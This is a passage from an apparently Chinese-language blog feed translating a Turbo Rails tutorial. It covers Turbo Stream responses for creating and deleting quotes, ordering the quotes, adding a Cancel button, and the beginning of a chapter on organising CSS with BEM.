&lt;% end %><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>是时候介绍：<code>Turbo_Stream format</code>了</p>
<h3 id="The-Turbo-Stream-format"><a href="#The-Turbo-Stream-format" class="headerlink" title="The Turbo Stream format"></a>The Turbo Stream format</h3><p>在Rails7中，表单提交会附带<code>Turbo_Stream format</code>，我们删除一个quote，并看看Rails的日志</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Started DELETE <span class="token string">"/quotes/908005781"</span> <span class="token keyword">for</span> <span class="token number">127.0</span>.0.1 at <span class="token number">2022</span>-01-27 <span class="token number">15</span>:30:13 +0100
Processing by QuotesController<span class="token comment">#destroy as TURBO_STREAM</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>可以看到<code>#destroy</code>带有<code>Turbo_Stream</code>，让我们看看怎么利用它去解决上面的问题</p>
<p>在Controller中，我们需要通过<code>respond_to</code>支持HTML和<code>Turbo_Stream</code></p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># app/controllers/quotes_controller.rb</span>

<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">destroy</span></span>
  <span class="token variable">@quote</span><span class="token punctuation">.</span>destroy

  respond_to <span class="token keyword">do</span> <span class="token operator">|</span>format<span class="token operator">|</span>
    format<span class="token punctuation">.</span>html <span class="token punctuation">&#123;</span> redirect_to quotes_path<span class="token punctuation">,</span> <span class="token symbol">notice</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"Quote was successfully destroyed."</span></span> <span class="token punctuation">&#125;</span>
    format<span class="token punctuation">.</span>turbo_stream
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>我们创建对应的视图</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;%# app/views/quotes/destroy.turbo_stream.erb %>

&lt;%= turbo_stream.remove "quote_#&#123;@quote.id&#125;" %><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>我们在浏览器中再次删除quote，并查看响应的HTML数据：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>turbo-stream</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>remove<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>quote_908005780<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>turbo-stream</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>这个就是<code>turbo_stream helper</code>接收了<code>remove</code>方法和<code>&quot;quote_#&#123;@quote.id&#125;</code>，然后又转化为了<turbo-stream>自定义标签</p>
<p><strong>当浏览器接收到了这段HTML代码，Turbo知道怎么拦截它，</strong>找到对应的参数ID，我们的例子中，就是删除掉已经被删除了的数据frame，而其他的页面不变，这正是我们想要的。</p>
<hr>
<p>注意：当我写下本章内容时，<code>turbo_stream helper</code>可以帮助我们响应下面的方法：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Remove a Turbo Frame</span>
turbo_stream.remove

<span class="token comment"># Insert a Turbo Frame at the beginning/end of a list</span>
turbo_stream.append
turbo_stream.prepend

<span class="token comment"># Insert a Turbo Frame before/after another Turbo Frame</span>
turbo_stream.before
turbo_stream.after

<span class="token comment"># Replace or update the content of a Turbo Frame</span>
turbo_stream.update
turbo_stream.replace<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>当然除了需要一个对应的方法，<code>turbo_stream helper</code>也需要一个 partial and locals 作为参数，来知道需要操作哪个HTML使用对应方法。后面我们将展开学习。</p>
<hr>
<p>有了Turbo Frame 和TURBO_STREAM format的结合，我们将能够在我们的网页上执行精确的操作，而不必写一行JavaScript，因此保留我们的网页的状态。</p>
<p>还有就是，turbo_stream helper 也可以使用<code>dom_id</code>，因此我们再修改：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;%# app/views/quotes/destroy.turbo_stream.erb %>

&lt;%= turbo_stream.remove @quote %><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h3 id="Creating-a-new-quote-with-Turbo-Frames"><a href="#Creating-a-new-quote-with-Turbo-Frames" class="headerlink" title="Creating a new quote with Turbo Frames"></a>Creating a new quote with Turbo Frames</h3><p>也就是我们的quote编辑器新增功能，在深处实现之前，我们先画几个草图说明。</p>
<p>我们希望当点击New quote时，表单可以出现在页面头部的下面，当创建好后，把新加的数据放到列表的最上面，并删除原来的表单。为此我们需要多两个Turbo  Frames：</p>
<ul>
<li>一个空的Turbo Frame，帮助我们接收新增表单</li>
<li>一个Turbo Frame嵌套住原来的数据集合，然后可以让新的数据放到最前面。</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/img_convert/166f7aed5ce32886972a2a6e8d89ebc9.png" alt="img"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/1e1bb685c8587ca8d81e6c3f391169c4.png" alt="img"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/2a414f446fa7b1ed984d81dac501486e.png" alt="img"></p>
<p>开始写代码：</p>
<p><code>Quotes#new</code>页面</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;%# app/views/quotes/new.html.erb %>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>main</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  &lt;%= link_to sanitize("<span class="token entity named-entity" title="&larr;">&amp;larr;</span> Back to quotes"), quotes_path %>

  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>header<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>New quote<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>

  &lt;%= turbo_frame_tag @quote do %>
    &lt;%= render "form", quote: @quote %>
  &lt;% end %>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>main</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>因为这里的<code>@quote</code>是一个新的记录，所以下面三个表达式是等价的：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">turbo_frame_tag <span class="token string">"new_quote"</span>
turbo_frame_tag Quote.new
turbo_frame_tag @quote<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>现在我们给<code>Quotes#index</code>页面中加入一个空Turbo Frame使用相同的ID，为了接收 new quote form。</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;%# app/views/quotes/index.html.erb %>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>main</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>header<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Quotes<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
    &lt;%= link_to "New quote",
                new_quote_path,
                class: "btn btn--primary",
                data: &#123; turbo_frame: dom_id(Quote.new) &#125; %>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>

  &lt;%= turbo_frame_tag Quote.new %>
  &lt;%= render @quotes %>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>main</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以看到我们添加了一个空的Turbo Frame，并且在”New quote”中指定：<code>data: &#123; turbo_frame: dom_id(Quote.new) &#125;</code>用来与连接这个空的Turbo Frame，也就是使用我们之前将的规则3。让我们写下会发生什么事儿：</p>
<ol>
<li>当我们点击<code>New quote</code>链接，点击事件会被Turbo拦截</li>
<li>Turbo知道了该请求将会与id为<code>new_quote</code>的frame进行互动，这源于我们在<code>New quote</code>链接上指定的<code>data-turbo-frame</code></li>
<li>该请求会以ajax形式发送，并且服务端会返回id为<code>new_quote</code>的<code>Quotes#new</code>页面</li>
<li>当浏览器接收到了这段HTML，Turbo将会提取<code>Quotes#new</code>页面中，id为<code>new_quote</code>的frame，然后替换<code>Quotes#index</code>中相同id的frame</li>
</ol>
<p>我们再试试提交空的数据，当点击<code>Create Quote</code>按钮时，数据是异常的，而异常信息应该出现在页面中，我们再说的细一些</p>
<ol>
<li>当我们点击<code>Create Quote</code>按钮时，表单提交将被Turbo拦截</li>
<li>表单将被id为<code>new_quote</code>的frame嵌套</li>
<li>服务端接收到了异常参数，并返回<code>Quotes#new</code>页面并带有异常信息</li>
<li>浏览器接收到<code>status: :unprocessable_entity</code>的响应时，就会将新的<code>new_quote</code>的frame替换原先的，并带有异常信息</li>
</ol>
<p>现在我们已经完成了草图上的设计，还有一件事儿就是将正常添加的数据，放在数据列表的上面。</p>
<p>如果你在浏览器中去试试，发现虽然数据已经创建到数据库了，但数据并没有放到数据列表的最上面。这是为啥？</p>
<p>当我们用一个正常数据提交表单时，<code>QuotesController#create</code>将会返回<code>Quotes#index</code>页面，其中嵌套一个id为<code>new_quote</code>的空frame，Turbo将会用这个替换我们之前的表单，但是Turbo并不知道怎么处理这个新加的数据，它应该被放到哪里？所以我们将使用Turbo Stream view来处理。</p>
<p>先声明<code>QuotesController</code>需要同时支持HTML和Turbo_Stream formats:</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># app/controllers/quotes_controller.rb</span>

<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">create</span></span>
  <span class="token variable">@quote</span> <span class="token operator">=</span> <span class="token class-name">Quote</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">(</span>quote_params<span class="token punctuation">)</span>

  <span class="token keyword">if</span> <span class="token variable">@quote</span><span class="token punctuation">.</span>save
    respond_to <span class="token keyword">do</span> <span class="token operator">|</span>format<span class="token operator">|</span>
      format<span class="token punctuation">.</span>html <span class="token punctuation">&#123;</span> redirect_to quotes_path<span class="token punctuation">,</span> <span class="token symbol">notice</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"Quote was successfully created."</span></span> <span class="token punctuation">&#125;</span>
      format<span class="token punctuation">.</span>turbo_stream
    <span class="token keyword">end</span>
  <span class="token keyword">else</span>
    render <span class="token symbol">:new</span><span class="token punctuation">,</span> <span class="token symbol">status</span><span class="token operator">:</span> <span class="token symbol">:unprocessable_entity</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后再创建关联的视图</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token comment"># app/views/quotes/create.turbo_stream.erb %></span>

<span class="token operator">&lt;</span><span class="token operator">%=</span> turbo_stream<span class="token punctuation">.</span><span class="token keyword">prepend</span> <span class="token string-literal"><span class="token string">"quotes"</span></span><span class="token punctuation">,</span> <span class="token symbol">partial</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"quotes/quote"</span></span><span class="token punctuation">,</span> <span class="token symbol">locals</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token symbol">quote</span><span class="token operator">:</span> <span class="token variable">@quote</span> <span class="token punctuation">&#125;</span> <span class="token string-literal"><span class="token string">%>
&lt;%= turbo_stream.update Quote.new, "" %></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>在这个视图中，Turbo做了两件事儿</p>
<ol>
<li>告诉Turbo去把<code>app/views/quotes/_quote.html.erb</code>放到id为quotes的frame前面，这里可以看到我们可以直接传参关联。</li>
<li>第二行代码告诉Turbo去更新id为<code>new_quote</code>的frame，变成空内容。</li>
</ol>
<p>现在我们就修改<code>Quotes#index</code>页面，将quotes集合使用id为quotes的frame进行嵌套</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;%# app/views/quotes/index.html.erb %>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>header<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Quotes<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
    &lt;%= link_to "New quote",
                new_quote_path,
                class: "btn btn--primary",
                data: &#123; turbo_frame: dom_id(Quote.new) &#125; %>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>

  &lt;%= turbo_frame_tag Quote.new %>

  &lt;%= turbo_frame_tag "quotes" do %>
    &lt;%= render @quotes %>
  &lt;% end %>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>现在我们再在浏览器中看看，如果你打开控制台的网络，你将看到表单提交的响应内容将会长下面的样子：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>turbo-stream</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>prepend<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>quotes<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>turbo-frame</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>quote_123<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
      <span class="token comment">&lt;!-- The HTML for the quote partial --></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>turbo-frame</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>turbo-stream</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>turbo-stream</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>update<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>new_quote<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">></span></span>
    <span class="token comment">&lt;!-- An empty template! --></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>turbo-stream</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>我们传递的参数，可以被Turbo理解，然后Turbo执行对应的行为（append, prepend, replace, remove）在目标Fream中</p>
<hr>
<p>现在我们讲讲一些技巧，关于<code>Turbo Stream views</code>中，不同的写法代表的意思是一样的。</p>
<ul>
<li>这是我们之前写的</li>
</ul>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;%# app/views/quotes/create.turbo_stream.erb %>

&lt;%= turbo_stream.prepend "quotes", partial: "quotes/quote", locals: &#123; quote: @quote &#125; %>
&lt;%= turbo_stream.update Quote.new, "" %><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li>当一行过长时，我们可以修改一下</li>
</ul>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;%# app/views/quotes/create.turbo_stream.erb %>

&lt;%= turbo_stream.prepend "quotes" do %>
  &lt;%= render partial: "quotes/quote", locals: &#123; quote: @quote &#125; %>
&lt;% end %>

&lt;%= turbo_stream.update Quote.new, "" %><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li>而在Rails中下面的表述是一致的</li>
</ul>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">render partial: "quotes/quote", locals: &#123; quote: @quote &#125;
render @quote<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<ul>
<li>所以我们将我们写的进行简化</li>
</ul>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;%# app/views/quotes/create.turbo_stream.erb %>

&lt;%= turbo_stream.prepend "quotes" do %>
  &lt;%= render @quote %>
&lt;% end %>

&lt;%= turbo_stream.update Quote.new, "" %><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li>而这里的行并不长，所以不需要使用块儿语法</li>
</ul>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;%# app/views/quotes/create.turbo_stream.erb %>

&lt;%= turbo_stream.prepend "quotes", @quote %>
&lt;%= turbo_stream.update Quote.new, "" %><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>够优雅吧？这就是一些写<code>Turbo Stream views</code>的不同方式</p>
<h3 id="Ordering-our-quotes"><a href="#Ordering-our-quotes" class="headerlink" title="Ordering our quotes"></a>Ordering our quotes</h3><p>还有一个细节问题，当我们觉得把新加的quote加入到quotes列表的最前面时，但页面刷新时，顺序又乱了，我们应该保证quotes始终按照时间进行倒序展示，最新的放在最上面，让我修改一下<code>Quote model</code></p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># app/models/quote.rb</span>

<span class="token keyword">class</span> <span class="token class-name">Quote</span> <span class="token operator">&lt;</span> ApplicationRecord
  validates <span class="token symbol">:name</span><span class="token punctuation">,</span> <span class="token symbol">presence</span><span class="token operator">:</span> <span class="token boolean">true</span>

  scope <span class="token symbol">:ordered</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">&#123;</span> order<span class="token punctuation">(</span><span class="token symbol">id</span><span class="token operator">:</span> <span class="token symbol">:desc</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后再在<code>Controller#index</code>中使用</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># app/controllers/quotes_controller.rb</span>

<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">index</span></span>
  <span class="token variable">@quotes</span> <span class="token operator">=</span> Quote<span class="token punctuation">.</span>ordered
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>现在即使页面刷新，顺序也是不变的。</p>
<p>记得修改对应的测试代码，来让测试通过</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># test/system/quotes_test.rb</span>

setup <span class="token keyword">do</span>
  <span class="token comment"># We need to order quote as well in the system tests</span>
  <span class="token variable">@quote</span> <span class="token operator">=</span> Quote<span class="token punctuation">.</span>ordered<span class="token punctuation">.</span>first
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>测试已经可以全部通过了，我们学习了很多技巧，而几乎只写了几行代码</p>
<h3 id="Adding-a-cancel-button"><a href="#Adding-a-cancel-button" class="headerlink" title="Adding a cancel button"></a>Adding a cancel button</h3><p>现在一切工作良好，但是我们希望可以加一个<code>Cancel</code>按钮在<code>quotes/_form.html.erb</code>视图中。</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;%# app/views/quotes/_form.html.erb %>

&lt;%= simple_form_for quote, html: &#123; class: "quote form" &#125; do |f| %>
  &lt;% if quote.errors.any? %>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>error-message<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
      &lt;%= quote.errors.full_messages.to_sentence.capitalize %>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
  &lt;% end %>

  &lt;%= f.input :name, input_html: &#123; autofocus: true &#125; %>
  &lt;%= link_to "Cancel", quotes_path, class: "btn btn--light" %>
  &lt;%= f.submit class: "btn btn--secondary" %>
&lt;% end %><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>我们在浏览器中试试看，发现一切正常，我们看看到底发生了什么</p>
<p>当我们点击 <strong>new quote form 中的Cancel链接时</strong></p>
<ol>
<li>这里的link是嵌套在id为<code>new_quote</code>的Frame中，所以Turbo也只会替换这部分内容</li>
<li>这里的link导航到了<code>Quotes#index</code>页面，其中嵌套了id为<code>new_quote</code>但是是空的frame</li>
<li>Turbo就用目标页面的空frame替换掉了原来页面的form表单，所以表单消失了</li>
</ol>
<p>当我们点击 <strong>edit quote form 中的Cancel链接时</strong></p>
<ol>
<li>这里的link是嵌套在id为<code>dom_id(quote)</code>的frame中，所以也是替换这部分</li>
<li>这里的link导航到了<code>Quotes#index</code>页面，其中嵌套了id为<code>dom_id(quote)</code>的frame，内部含有对应quote的html数据</li>
<li>然后引用这段html替换，原先的form表单，所以表单消失了</li>
</ol>
<p>当我们再创建quote并且同时修改多个quote时，我没法发现页面的状态是保留的，这么的各个部分是独立保留的，这就是Turbo带给我们的能力，而不需要写自定义的JS。</p>
<h3 id="Wrap-up"><a href="#Wrap-up" class="headerlink" title="Wrap up"></a>Wrap up</h3><p>这一章节，我们替换了原先传统的CRUD，变成一个响应式应用，而这几乎不需要什么代码，你可以试着创建，修改，删除，查看数据，感受一下我们的应用。学了很多东西，让我们休息一下，然后把所有内容理清楚。</p>
<p>下一章中，我们将使用<code>Active Cable</code>来给系统加入实时更新的特点。</p>
]]></content>
      <categories>
        <category>Turbo-Rails</category>
      </categories>
      <tags>
        <tag>Rails</tag>
        <tag>turbo</tag>
      </tags>
  </entry>
  <entry>
    <title>Turbo Rails Tutorial-第三章</title>
    <url>//post/Ruby/Hotails/%E7%AC%AC%E4%B8%89%E7%AB%A0.html</url>
    <content><![CDATA[<p>​    </p>
<h2 id="组织CSS文件"><a href="#组织CSS文件" class="headerlink" title="组织CSS文件"></a>组织CSS文件</h2><p>这一章我们将使用<code>BEM</code>方法论，去设计项目的CSS样式，这里我们将不会使用<code>Bootstrap</code>或者<code>Tailwind</code>，因为作者觉得不好看，并打算展示一些技巧</p>
<p>如果你喜欢CSS，你可以学习到一些技巧，如果你不喜欢，也可直接复制代码，进入下一章的<code>Turbo</code>学习</p>
<h3 id="我们的CSS风格"><a href="#我们的CSS风格" class="headerlink" title="我们的CSS风格"></a>我们的CSS风格</h3><p>CSS是一个比较难掌握的话题，像其他的编程一样，它需要一些风格和约定才能更好的使用，而学习写CSS最好的办法就是写一个小项目去设计样式</p>
<h3 id="BEM方法论"><a href="#BEM方法论" class="headerlink" title="BEM方法论"></a>BEM方法论</h3><p>对于命名约定，我们使用<code>BEM</code>方法论，它是简单易懂的，总结为以下三点：</p>
<ol>
<li>每个 component(or block) 应有有独立的名字，比如系统中的<code>card</code>，<code>.card</code>的CSS类应该定义在<code>card.scss</code>文件中，这就BEM中的B。</li>
<li>每个 block 可能有多个 elements，比如 card 举例，每个card都有 title 和 body，在BEM中我们应该写为 <code>.card_title</code> 和 <code>.card_body</code>，这样就可以避免命名冲突，如果另有一个block为 <code>.box</code>也有 title 和 body，那么这个就是<code>.box_title</code>和<code>.box_body</code>，这就是BEM中的E</li>
<li>每个 block 可能有多个 modifiers，再用 card 的例子，每个card可能有不同的颜色，那这个命名就该是：<code>.card--primary and .card--secondary</code>这就是BEM中的M</li>
</ol>
<p>这样就可以避免命名冲突了</p>
<h3 id="组织CSS文件-1"><a href="#组织CSS文件-1" class="headerlink" title="组织CSS文件"></a>组织CSS文件</h3><p>现在我们有了健壮的命名约定，是时候讨论文件组织了，这个项目很简单，我们也会有一个简单的架构</p>
<p>我们的<code>app/assets/stylesheets/</code>文件夹将会包含4个 elements</p>
<ul>
<li><code>application.sass.scss</code>导入所有的样式</li>
<li><code>A mixins/ folder where we&#39;ll add Sass mixins</code></li>
<li><code>A config/ folder where we&#39;ll add our variables and global styles</code></li>
<li><code>A components/ folder where we&#39;ll add our components</code></li>
<li><code>A layouts/ folder where we&#39;ll add our layouts</code></li>
</ul>
<h4 id="components-和-layouts-有什么区别？"><a href="#components-和-layouts-有什么区别？" class="headerlink" title="components 和 layouts 有什么区别？"></a>components 和 layouts 有什么区别？</h4><p>components是页面中独立的部分，它不应该关心它会被放到哪里，而是只关心样式，一个好的例子是：按钮，按钮不知道它会被放哪里</p>
<p>layout相反的，不添加样式，只关注与定位，好的例子是：<code>container</code>转载页面内容，如果你好奇样式相关内容，可以看这里：</p>
<p>一旦我们建立了我们的设计系统，我们将能够创建新的页面在没有时间编写额外的CSS组成组件和布局。</p>
<hr>
<h4 id="注意-components-和-margins"><a href="#注意-components-和-margins" class="headerlink" title="注意 components 和 margins"></a>注意 components 和 margins</h4><p>理论上，components不应该有外边距，当我们设计一个独立的components时，我们也不知道他被放到页面哪里。比如按钮，不管是垂直还是水平放置，都没道理增加外边距，出现几个空格的距离。</p>
<p>我们不能提前预知独立的components在哪里被使用，这是layouts的职责，随着 design system 的壮大，如果components更容易与其他组件合作将会更容易的复用。</p>
<p>虽然那么说，但是在本教程中，我们将打破这些规则，我会直接在components上加入margin。因为这个项目不会再扩展，我不希望事情变的太复杂，不过如果你做真实项目时，应该记住上面的规则</p>
<hr>
<p>足够的理论了，现在我们将要写SASS代码了，让我们开始吧</p>
<h3 id="使用我们自己的CSS在quote编辑器上"><a href="#使用我们自己的CSS在quote编辑器上" class="headerlink" title="使用我们自己的CSS在quote编辑器上"></a>使用我们自己的CSS在quote编辑器上</h3><h3 id="The-mixins-folder"><a href="#The-mixins-folder" class="headerlink" title="The mixins folder"></a>The mixins folder</h3><p>这个文件夹是最小的，只有一个<code>_media.scss</code>文件，我们将定义一个<code>breakpoints</code>为<code>media queries</code>，在我们的项目只有一个叫做<code>tabletAndUp</code>的<code>breakpoints</code></p>
<pre class="line-numbers language-css" data-language="css"><code class="language-css">// app/assets/stylesheets/mixins/_media.scss

<span class="token atrule"><span class="token rule">@mixin</span> <span class="token function">media</span><span class="token punctuation">(</span>$query<span class="token punctuation">)</span></span> <span class="token punctuation">&#123;</span>
  <span class="token atrule"><span class="token rule">@if</span> $query == tabletAndUp</span> <span class="token punctuation">&#123;</span>
    <span class="token atrule"><span class="token rule">@media</span> <span class="token punctuation">(</span><span class="token property">min-width</span><span class="token punctuation">:</span> 50rem<span class="token punctuation">)</span></span> <span class="token punctuation">&#123;</span> <span class="token atrule"><span class="token rule">@content</span><span class="token punctuation">;</span></span> <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
